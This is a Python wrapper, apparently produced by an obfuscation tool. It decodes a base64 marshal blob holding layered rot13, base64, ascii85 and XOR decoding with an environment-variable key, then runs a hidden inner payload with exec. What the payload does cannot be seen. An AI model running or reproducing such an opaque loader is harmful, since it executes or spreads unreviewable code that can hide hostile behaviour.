#!/usr/bin/env python3
# ultraenc final wrapper â€” keeps internals hidden
import base64, marshal

DATA = """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DAEIAXIDAAAAYVQTAABuS1dQV3ljNnJhYnVWR2ptV1BSYU0wMXVWRjA4TUo0dVZGRUNaUTFpTFB0MkRGMGdISGI5bzJ4aEEwUmdZSVNZQ0o5bEFRdU9ZRjFFR1Exald3YjVERjBnSEgwOXBQOU5CeFJnWUlTQkNLTjRFd2dPWUYxRUdtMWpESGtVREYwMkMwTVlFR0gyS0hSZ0ZSZ1hGMEhmWlMxT1lJY0tHeGdTWVFPckRIeDdweUFRRHhTQ1lSU1dFRk1BRGx0ZkthU09ZdlJjSVJJd0N5V2REbHRlSXlmY1dQU2JHUkQvcDJJdERGNGVWemI5cEZqeEdSU1dKUXFnVkdqL0pRWjdKeGIySUhNdEZIdXJWRlZjREYxU1lGQVZYSEFsRUlaeEJTT2FHbDVSTXlFWUFGZ1BabXUwRDJ5am4wRGtYUHVqSDJObUV2YnZMUUFUWVRJU0p6THlZUkRhWjNSbUVKWndHdjVOQjBnV0xsZ1JCU0h3RXZiYnFHTVBvUElaWFA4akZ5eVhFeEF6Q2x1U0wxeXlBbXVmRngxcFgwSWJDUTA4WHdaZER4QWNDVVZpRVRJbG52TU5CME51V1JOOG9SV2pER3Rmbno5U0tRcXJMVWI2WkhNT1gzYzZWRlJ1WlBMdVZGUi9YbFJ1VjBPeFZGUnlYU0x1VkZSdkV3V1lIM1IyVkh5Q29VTnVGSDlsSnZTVHFHcWVWeE1JREk4dlhtUmxMbFNiS0lWY1Z4QWtLUU51TVFFRUxHT0ZHYUVrVnY4ZktLVnVYSnlmRXZWY0EzWi9WRnljbmxadVlIU1BuSFN3SXoxb1Z3eU9HUmZiblFrYm9GWmJZSVJlVkhxQUh3eHVWSXFUWGxSZUp2dUxWeE1yRnlOdVgxYmJKUFdUS3hiZ1ZGTGVEMk51WEp5ZUZQWitKUmtkVkZSdVZIYnZBR0Exb3hTRklQZ3BFSkFxcEcxU1hsY3dwSERqWDBENUV4RDFJUHFSTWFOanFGTDNGMDVtRDJ1b0R6TVRFUUluWndOMUN5U1ZFUmpjS3l5Uk13T25ZeEVZRkh4akZQQUZDMGZ1QlFxSE14SXdIRng5WXdPaEhHRVNMd04yQUhTSEdLWjNNbE1lcUZTVEVGNVZMUFJ1WFM1SURtWmVDUVdhV2FJQVkwcXFLMXVVQW1rY0NTV1NZRmt6QVJFSkN3VjJFeEhpTXdNYVd6a1hDUkFjSVNJTFZGUnlXUlZ1VkZSd0hGU1ZISmtqREliMUp4MHpMMTloWjNSL013OGdEMnlkS0ZnT0gzSHVESnBhRVRWaERKNCtDSTVPSVNaM0p2UnVXRnFBcnZSOEd3eDNWRzQxRVE4dUNGOXFCRlNWRnpnR1ZGUnhHUVM2cnZSdVZGUnhWRlJ1VkZwdVZGUnVNUFJ1VkZWL0N5UjlMRnVPWUZEbUR4dWNJU3A1REYwNERGeGJEeE8wRmx1UERVRVhYUldPbnpXVEJGRW9uUkw1WUh5dkRKQXhIMkVTS3dIdUh4TDVDbXFwRlR5b0xJMU9ZSVNFR1I0OENTa2hYUlYvREo5V1pQZjVxUnVjTUhXaEZUeXBudkFPWUdBSkZ3V25IbXBnRXd5b1h6OVlYSmcxSEh1Y01RRVZZd09sSjNOaFpGODBXUUVucVVTZUFTYzBwSmYwSmFFa25tRW5xVVNlQVNjMHBKZjBKYUVrbm1FbnFVU2VBU2MwcEpmMEphRWtubUVvVnZ5aVdReXJHYU9hV3lNRFlQMWpCSTVKQVNjMHBKZjBKYUVrbm1FbnFVU2VBU2MwcEpmMEphRWtubUVucVVTZUFTYzBwSmYwSmFFa25tRW5xVVNlQVQwOFZ4YnVWRkFZTXZTaG9KeWdFUnl4Q1VXVER5RGNMSEVZRGFXTkRJV09uMklOcEpNTFhsQUFGMDR1RXZ1aUd3SVREMFZ6cDBTc0ZHdTBEemZjQlEwdkVUdXhveE1TWXpPYlZGUmJLeU1PQkhFdVl4TGNuVE9kVkZSYkt5TVNZVDluWkhMOURRMVVWelJ2RkZBUW5RZjhXMFIzQklXYU1sTWZCUXlURUY1MW9sUnVXRkVEVkZSdVZ3NGFYdkx2QVRwYUIxamtEVVcxRXZxUkRGYnVHRlJnQlNPWVZGUnVWRlZiS0pWZEZGeC9HUnVCVjFTcHB6dHVWRlJ2WWxSOENQYnZyYWJ6RlJFeVp2RG1aRkxlQXg1TlhKRVRYd3FITHZSZUp2Z01WSE0xQTFidVlRV1dLdlN4Skc1MVZHVmFEUTh1WndPVERGVmFBSGIvWWwxVXBhTnVNU1YyQkZSaENLRUJWRjR3Q2xEdlhtUjJYUFNXSkZNQ1ZGY1lCbUR1WXc0dVZGV1NWeVNLVkY0K1ZGUnZDeFdhWlBSaEFUTWJWeEFrSUk0dlgzT01BdlJoQ0pra1Z2ZmtZMWp2QzFjb1hsV3NBMkV1VkdTQnFQUndYMXlkRmxTV0pGMHVWSHVwRlNEd0QwdXFZRlNxR1BmZ1ZIeURXYUh1THdnRlZGUmdESFdIV1BIY0xSVnVaSlJrRVBTV0pHTnZWSHVwRlNEeERSSHpaRlNxR1BmZ1ZIeURYdlJ1THdnb1dQUmdESFdIV0ZWeld4SHVaSlJrRVBTV0pHWndWSHVwRlNEeUNIU1JBRlNxR1BmZ1ZIeURZRlZ1THdneFdsUmVKdmdNVjE1d29hSWlIdkVqSVBJa0ZRTU9WSkUwREtadkttdG1vRkR5WEk5dFd6NVJKeHB1THdqdlhGVmVCeDFpVnhBbEFhUnhEUkVlcHZXUXB3eWtXUlJpRG0wdVl3MWZwRkVORVQ1d1hSdXNLUTR2S211VnFQUmtHYUVuVkpJSUd2SHhKMTkwcGxXUXB4VzBXU2tYR1E0dVl3MWZwRkVvTFBXeFhISXBWeHBoVkZrbll2QU5vekF1WHZnSVhQWmRMd01OQ2xSZXFIa1ZYMEFmSUZiZUttV3hJdldUSUkwZVdVSGdXYVZ5QkhJQ0ZHT1NLMFMwVkpwdUVsNUFDbGNyWHZWNURIa1lYUVNwSkdmdkZKTVFLdlN4cVIxblZGY1lCbUR1WXc0dVZGV1NWeVNLVkY0K1ZGUnZDeFdhWlBSaEFUTWJWeEFsTVBieUN2Z3JEUFJoQ0pra1dHMU9BVExjTEZWZUR2RHZIUTgzVkgxUE1UNHVadnFyb3ZSaEN3OGNXSUxnb2xIdU1sU1hYUlprRnkwK1ZHVmFMR1ZncVJNeFZsU2JaUVNwVkpFMElQRHlDSFNvcGw1QW5GdWtZYVNRWnhSaUkwV2RvdnlaSW1PU1d3NGpHSWp1R0hnQXBQUmRCRjhsVkZTU0JGeHVZYUVOSGxSZkxSSGJWR09OQlBwdUtUU0hJUFJ1WHZwd1ZGY1lCdkx1WUhTbnFQSWtGR2JpVkZnb0lUYmlBMTQrb1BWZ0FTdUdXd3lYRWFEekJ3MURZUEwzTVJwY1pSOTFvYUR2QkhTWlhQUmVKdnAwVkZTU0J5WnVwbE1RQ3ZNYnAwV1hWSkFqb0pEdVZGYmFWbFJ1WHZ0elZGUmRYUlJ6SGxjTUVGTHZDU1JqWkg5WUtsTHVYMWdySEZXdkhKcUpWRmt0VzJSekhsY3NHdlI4RUdSbFZGeWNuMHRsWVF0aXBsUnVWRkFFVkk5VkFRcHhJbWNESnhTSEVUYmFYME9YcVBwOXBUOU5LeHB5RTEwNERJV09xVEFUWHlrV0FSTVNFUmNRWjFrQll2QVNYM1ptV0hFc0N6U1BaUXB1TVNFUVpsZjhaeHRtb0Y4K0R6ajNHbERpb3o4M0pQWnpZbEVkRVJidU1tSGhCbUFhRXhIZ1Z2TWhaUU1zWEhjUG9UV2hCeHR3QTFBU1kyNDRNbWJqQVNBTFlsOUZuSExtWlFNc1hIY1BvVEFaSEhIYUJSa01DUGdIRjFEZURSQVNuMEl3bkhqZUJRSVJNeUg5cFRNTkswTjdJUk9xRlBaM0gwSVZBeVZ4RUhNUnFHY3JaUDh5QzFNTkIyMWNZSEl2SVJFUkVSeWdvMEFTTHY5ZnFSTGRYSHFYWlFIMURJeVZBUGNKQ0dJMUJTZ0RBS0laQkhqaEVtMWlFeFIzQkhNMFZ6OWhJbHBoWlFrbklReDBMUldEVmxTZkxGOU9JUVd1QmwwK0Ewa1FFRjB2V3o0akFSU2FBdjloV3dEbUV2dVlXbHlPQTBOaldSRXpXRjQ1RUZnanFSZmtZUFJnR3hTRk14NC9DSjlwR2xMaFpRa25KeFdmRlJPWURHeGNBbE1UV211MW5STjhMdnVCRElOeExsMU5DVGtpRGxTd01IU1FWRlJ5V1JWdVZGUnZERnVxSlI4NUFLSDZZVVNRR1VTd0F4dHdGSHlObkpJU0lHMU5DUTg4bzBFV00xa2RDS09vRmx1VExTTGVMbWN4TVNxRldQVjNCekFUWFJmYVhIUjNEemJkRHlTR0NtdVRWMmdtWUhXZkJQRGJFSlpmRlFTT0EwTmpBUldFV0hJY0VSRHdKUlJqQWxWMFkwV0VXSEljRVJXQUdKcVREMk1ZWkhTSElHMGZDS1NETTJ1Uk1GYjVvbTlNRzBEdkRJRVJKbFdURDFrY0xGV1NXdnF2RUYxc0lHa1RXejFHblA5RHBRNGxXU1o4cHlPUk14TjZGSEV6SVVXTkNLTmdIR0xqRnh1WG55Y2NEbHRlWXdPWEJHTU5wVVo5cUhNdEdGTHdFVE1qWTBPVExTOUxBUFJ1VkZWK1Z5RUdHdk1USW1jT0tGUmZMMXVyRUZEbVdhV05CMDVmTUpPWm5RcWRKdkFvTVRNUU0ydGpuUlNPbjJOMlgwTDBvbEFSWXY1UFhtZ3lXbU1GWG0xWnB3OVFFSU4rTG1PWEV5TWFFVE1IcEhnVEltUjdLUFJ2WEhSZ0ZQa0VxUU5lRVBaYnFSQWNMR2poWDBFZU0xcGVDSDFaTTBFUUZJSWJNbE1uRnZMdlhHV3JLSnB6STJ1b1ZITVpZSUhpcFB4K0oycHpKeEVSVnpSZXBQUmlHdzRqSjJwYUVRdGdEVVdVb0prUkZ2ZjRWRjlpVjB1VUVSZjJGMjB1VkZBWVlsdVBDSEw0RXlNQ29TTHVYeklWSElPb1lSRGNEUWtpTUtXVENScGhYeFdmV0draVoxY2xLMVZpcFB4K0psZjlCUUVGVzBJT1htSCtCSVY0cFF4MENQZ3VKdkFiWGxXT0JQa2RwMFNGbzBqZ1l3VmJDdzFUWElPRVhSU0hJdnl2RHdFblpVSVJNeTR3WlJ0dXFRSWlFSkFBSVR0dVZGSHhHUFJ1VkZWK1gxRUFGMFdTSkhjWUh2UjRBMkR4RXk1ekNRU1JNRlNOVnhMMHBTODZFek5mb3dnVFh2dWxaeE10TG0xTkR6ajNvR0VUSFFNaEN4TVNadngzTWxwY0JtV1VEVFdhRmxBUEV4V2pEMnFhTTJXYVdhSCtBSFNIV1FaZEUwVmhFUTVPSVJSaEpGUnVYUzVJREd5UkxGNVNKeHBmSmxSeURIMHdYMjliSVJaOXBUTDZLSEhmSVRaOUMxY3JHbXA5cFQ5Tkt4SGZJVFo5QzF5TEpGQVJGU2ZqTFJSNEp4eGlXeHVSTUdXU0psdURMRlJkSVNONUZQWjNIMElTSm1TSkx2UmRJU2dqQXdqZ3B5Ui9Jd2thbnhJS0p3Y09WRmNISFFxTkkyQXVXbTFqRHZJcUVUSGRCSjlhV3liaHB2QXFDSGd6RUZjZ0dsZ1REeUF6TTBOOEhHSDVWeEF2TUlrT0sweGlwMElNQlE5RFZGMGlLU051VkZIeEhGUnVWRkFFVnhFa0h5MVJEdk1LSXZSZ0IwNVhWRlJ1VkZWdkJIU3daRlNLTFRabVdIZ0ZJSDh5RjFTYkJsTGdabXFPVjFTZUhRZnlGMVNiQmxJWUh2SC9WMVNlWndSdkJIU2NaRlY1REpqalYxU2Vad1J5RjFTYkJsSVlIdkgvVjFTZVlQOHZCSFMxQUZaMlZ6TGpXUVo2S1EwZUJHZ2xIRkFFbjFMOVdRWjZMdzhhRUhnbkxGcVNGM1djWFMxaEttNHVWRlJ3SEZBb0thU0lEUWZqSUpEL01sNUZubFJ1V0drREJRcXdDSEFPTWFBbkRHQW5vMmNFQnY4bUFIZ2FXbWMwb1JSNExhQXZDMklESUZxVlYyNHVKUFJ1VkZWK1kyQU1uMDlTSlIxZEZGUmdZMFNVVkZSYkt5QVJNeTFrQUZSdVZGVitYMUVBRjBXU0tJdDNXUFI0QTExd0MxYmFCenVPSHhTenFGVmNHSDl4TWxNMG5GeVBBeHlVTHhNUUR3WnpESUVKQko1U1lUMW5BRlJ1V0ZFRFZGUnVWdzR6TDE5aFowSU1CUTlEVkYwaUsxUnVWRnVySkdFUk12V1dFeTllSXlSdXBhVjhXUkkwSDB1RVZGU1NGU2J1SlMwMUN2QWdMVDBiVkcxellRMHVKUmNhQndXeG94a0dER1Z3TGFaam5hSWdvME9EblI5WERHcXpFd09OQUtOZlZ3U1pweHhjWkp1T0dQTU5vUDBsV0hPSUxUdGNaekh2RklSa0UzV0tHeE9KV0hjR0RHVmdXdkhrR1N1ekd4U0JBUHg92gVwbGFpbtoAKQFyJwAAACkWWgljeV9sb2FkZXJyAgAAAHIDAAAA2glFeGNlcHRpb25yDAAAAHIFAAAAchMAAAByNAAAAHIKAAAAchAAAAByEgAAAHIWAAAA2gNzdHJyIQAAAHIcAAAAciYAAABaB1BBWUxPQURaBE1PREVaCFNBTFRfSEVYWgdLRVlfRU5W2gRjb2Rl2gRleGVjcggAAAByCAAAAHIIAAAAcgkAAADaCDxtb2R1bGU+AwAAAHMiAAAAAgEUAQwBJgIIAwgDCAMIAxIDEgcYDA4IBAEEAQQBBAISAQ=="""

try:
    blob = base64.b64decode(DATA)
    code = marshal.loads(blob)
    exec(code)
except Exception as e:
    print("Hata:", e)
